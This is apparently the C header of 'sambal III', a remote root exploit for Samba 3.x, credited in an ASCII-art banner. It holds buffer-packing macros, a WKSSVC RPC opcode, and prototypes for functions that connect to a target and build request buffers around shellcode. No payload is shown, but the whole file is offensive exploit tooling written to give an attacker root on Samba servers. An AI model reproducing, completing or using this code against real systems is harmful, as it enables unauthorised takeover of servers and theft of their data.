/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#define WKSSVC_NETRWKSTATRANSPORTENUM   5

#define ADD_UINT32(ptr, val) do {\
        u_int32_t value = val;\
        memcpy(ptr, &value, sizeof(u_int32_t));\
        ptr += sizeof(u_int32_t);\
} while (0)

#define ADD_UINT16(ptr, val) do {\
        u_int16_t value = val;\
        memcpy(ptr, &value, sizeof(u_int16_t));\
        ptr += sizeof(u_int16_t);\
} while (0)

#define ADD_UINT8(ptr, val) do {\
        u_int8_t value = val;\
        memcpy(ptr, &value, sizeof(u_int8_t));\
        ptr += sizeof(u_int8_t);\
} while (0)

#define ADD_UTF16_STRING(ptr, val, size) do {\
        ADD_UINT32(ptr, size / 2);\
        ADD_UINT32(ptr, 0);\
        ADD_UINT32(ptr, size / 2);\
        memcpy(ptr, val, size);\
        ptr += size;\
        ADD_UINT32(ptr, 0);\
} while (0)

int exploit_samba(struct SMB_session *session);
void exploit_connect(struct SMB_session *session);
size_t exploit_build_buffer(char *buffer, unsigned char *shellcode, size_t shell_size);
size_t exploit_build_buffer_old(char *buffer, unsigned char *shellcode, size_t shell_size);

